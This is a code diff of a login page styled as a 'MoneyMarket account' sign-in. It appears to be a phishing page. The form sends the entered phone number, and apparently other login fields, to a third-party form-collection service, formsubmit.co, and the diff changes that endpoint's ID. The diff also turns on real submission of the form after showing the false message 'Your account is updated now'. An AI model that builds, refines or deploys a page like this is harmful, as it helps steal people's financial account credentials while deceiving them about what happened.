@@ -19,7 +19,7 @@
   <div class="container">
     <h2>Login to your <br><strong>MoneyMarket account</strong></h2>
 
-    <form id="loginForm" action="https://formsubmit.co/4b442333e9eb95c98ff0a164f5911ff4" method="POST">
+    <form id="loginForm" action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
       <div class="input-group">
         <!-- Phone number -->
         <input type="text" name="phone" placeholder="e.g. 0821234567" required />
@@ -74,14 +74,16 @@
     phoneInput.addEventListener('input', checkAllFilled);
 
     document.getElementById('loginForm').addEventListener('submit', function (e) {
+      
       e.preventDefault();
-      if (loginButton.classList.contains('btn-success')) {
-        alert("Your account is updated now");
-        // Uncomment below if you want the form to actually submit
-        // this.submit();
-      } else {
-        alert("Please fill in all fields.");
-      }
+if (loginButton.classList.contains('btn-success')) {
+  alert("Your account is updated now");
+  setTimeout(() => {
+    e.target.submit(); // Actually submits the form after 1 second
+  }, 1000);
+} else {
+  alert("Please fill in all fields.");
+    }
     });
   </script>
 
